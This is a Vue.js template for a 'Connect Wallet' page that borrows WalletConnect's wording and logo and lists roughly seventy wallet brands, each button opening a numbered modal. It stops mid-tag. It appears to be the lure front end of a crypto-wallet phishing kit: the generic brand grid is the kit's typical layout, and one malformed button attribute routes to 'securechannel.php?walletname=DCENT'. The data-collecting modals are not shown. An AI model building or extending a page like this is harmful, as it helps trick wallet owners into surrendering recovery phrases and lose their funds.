<template>
  <div>
    <div id="header">
      <div class="content-box-md">
        <div class="container">
          <div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12">
              <div class="header-text">
                <!-- <h4>Apps</h4> -->
                <img
                  class="text-center flex items-center justify-center header-img"
                  src="/img/lg/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png"
                  alt=""
                />
                <!-- <h4>Wallets</h4> -->
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="coin-section">
      <div class="content-box-md">
        <div class="container">
          <div class="row mb-10">
            <div class="text-center coin-section-header">
              <h1 class="animated pulse text-3xl">Connect Wallet</h1>
              <h6 class="animated pulse">
                Open protocol for connecting Wallets to Dapps
              </h6>
            </div>
          </div>
          <div class="row">
            <div class="coin-registry">
              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal100"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/brd.jpg" alt="" />
                <h4>BRD wallet</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal16"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/Coinbaselogo_Supplied_250x250-2.png"
                  alt=""
                />
                <h4>Coinbase</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal101"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/saitama.png" alt="" />
                <h4>Saitamask wallet</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal102"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/terra.png" alt="" />
                <h4>Terra station</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal103"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/phantom.jpg" alt="" />
                <h4>Phantom wallet</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal104"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/cosmos.png" alt="" />
                <h4>Cosmos station</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal105"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/exodus.png" alt="" />
                <h4>Exodus wallet</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png"
                  alt=""
                />
                <h4>Wallet Connect</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.png"
                  alt=""
                  style="border-radius: 40px"
                />
                <h4>Rainbow</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal2"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpg"
                  alt=""
                />
                <h4>Trust</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal3"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/argent.png"
                  alt=""
                />
                <h4>Argent</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal4"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.png"
                  alt=""
                />
                <h4>Metamask</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal5"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/binance-chain.png"
                  alt=""
                  style="border-radius: 50%"
                />
                <h4>Binance Chain</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal6"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/ecc31a8e-0ee9-49db-cc59-0876b7c35600/lg"
                  alt=""
                />
                <h4>Safemoon</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal7"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/0b7e0f05-0a5b-4f3c-315d-59c1c4c22c00/lg"
                  alt=""
                />
                <h4>Gnosis Safe</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal8"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpg"
                  alt=""
                />
                <h4>DeFi</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal9"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c.jpg"
                  alt=""
                  style="border-radius: 40px"
                />
                <h4>Pillar</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal10"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2.jpg"
                  alt=""
                />
                <h4>imToken</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal11"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpg"
                  alt=""
                />
                <h4>ONTO</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal12"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.png"
                  alt=""
                />
                <h4>TokenPocket</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal13"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/aave-aave-logo992f.png?v=022"
                  alt=""
                />
                <h4>Aave</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal14"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/2772.png" alt="" />
                <h4>Digitex</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal15"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/ledger.webp" alt="" />
                <h4>Ledger</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal17"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/portis_logo_dribbble.png"
                  alt=""
                />
                <h4>Portis</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal18"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/fortmatic.jpeg"
                  alt=""
                />
                <h4>Formatic</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal19"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpg"
                  alt=""
                />
                <h4>MathWallet</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal20"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b.jpg"
                  alt=""
                />
                <h4>BitPay</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal21"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/e8803581-a57f-4e4f-5a1b-c642c5da1900/lg"
                  alt=""
                />
                <h4>Ledger Live</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal22"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168.jpg"
                  alt=""
                />
                <h4>WallETH</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal23"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d.jpg"
                  alt=""
                />
                <h4>Authereum</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal24"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/dharma.png"
                  alt=""
                />
                <h4>Dharma</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal25"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/dce1ee99-403f-44a9-9f94-20de30616500/lg"
                  alt=""
                />
                <h4>1inch Wallet</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal26"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/5a96d19c-93d3-4e6a-624a-16f52773d000/lg"
                  alt=""
                />
                <h4>Huobi</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal27"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61.jpg"
                  alt=""
                />
                <h4>Eidoo</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal28"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e.jpg"
                  alt=""
                />
                <h4>MYKEY</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal29"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/2972bbf8-0891-414a-f63c-8d3bcf661d00/lg"
                  alt=""
                />
                <h4>Loopring</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal30"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6.jpg"
                  alt=""
                />
                <h4>TrustVault</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal31"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a.jpg"
                  alt=""
                />
                <h4>Atomic</h4>
              </button>
              <!-- Modal -->
              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal32"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e.jpg"
                  alt=""
                />
                <h4>Coin98</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal33"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/tron-trx-logo.png" alt="" />
                <h4>Tron</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693.jpg"
                  alt=""
                />
                <h4>Alice</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal35"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpg"
                  alt=""
                />
                <h4>AlphaWallet</h4>
              </button>
              <!-- Modal -->

              <button
                oncli
                @click="openModal"
                ck="location.assign('securechannel.php?walletname=DCENT)"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal36"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63.jpg"
                  alt=""
                />
                <h4>D'CENT</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.jpg"
                  alt=""
                />
                <h4>ZelCore</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/12f981b1-bb0a-4115-009f-317255979600/lg"
                  alt=""
                />
                <h4>Nash</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal39"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/1433894569.png" alt="" />
                <h4>Coinmoni</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal40"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702.jpg"
                  alt=""
                />
                <h4>GridPlus</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal41"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5.jpg"
                  alt=""
                />
                <h4>CYBAVO</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal42"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0.jpg"
                  alt=""
                />
                <h4>Tokenary</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal43"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50.jpg"
                  alt=""
                />
                <h4>Torus</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal44"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09.jpg"
                  alt=""
                />
                <h4>Spatium</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal45"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.png"
                  alt=""
                />
                <h4>SafePal</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal46"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6.jpg"
                  alt=""
                />
                <h4>Infinito</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal47"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b.jpg"
                  alt=""
                />
                <h4>wallet.io</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal48"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad.jpg"
                  alt=""
                />
                <h4>Ownbit</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal49"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c.jpg"
                  alt=""
                />
                <h4>EasyPocket</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal50"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb.jpg"
                  alt=""
                />
                <h4>Bridge Wallet</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal51"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1.jpg"
                  alt=""
                />
                <h4>Spark Point</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal52"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1.jpg"
                  alt=""
                />
                <h4>ViaWallet</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal53"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/ofbdehdu4sju07vlltgf"
                  alt=""
                />
                <h4>BitKeep</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal54"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c.jpg"
                  alt=""
                />
                <h4>Vision</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal55"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b.jpg"
                  alt=""
                />
                <h4>PEAKDEFI</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal56"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd.jpg"
                  alt=""
                />
                <h4>Unstoppable</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal57"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0.jpg"
                  alt=""
                />
                <h4>HaloDeFi</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal58"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e.jpg"
                  alt=""
                />
                <h4>Dok Wallet</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal59"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5.jpg"
                  alt=""
                />
                <h4>AT.Wallet</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal60"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719.jpg"
                  alt=""
                />
                <h4>Midas</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal61"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef.jpg"
                  alt=""
                />
                <h4>Ellipal</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal62"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img class="coin-img" src="/img/lg/keyringpro.webp" alt="" />
                <h4>KEYRING PRO</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal63"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpg"
                  alt=""
                />
                <h4>Aktionariat</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal64"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c.jpg"
                  alt=""
                />
                <h4>Talken</h4>
              </button>
              <!-- Modal -->

              <button
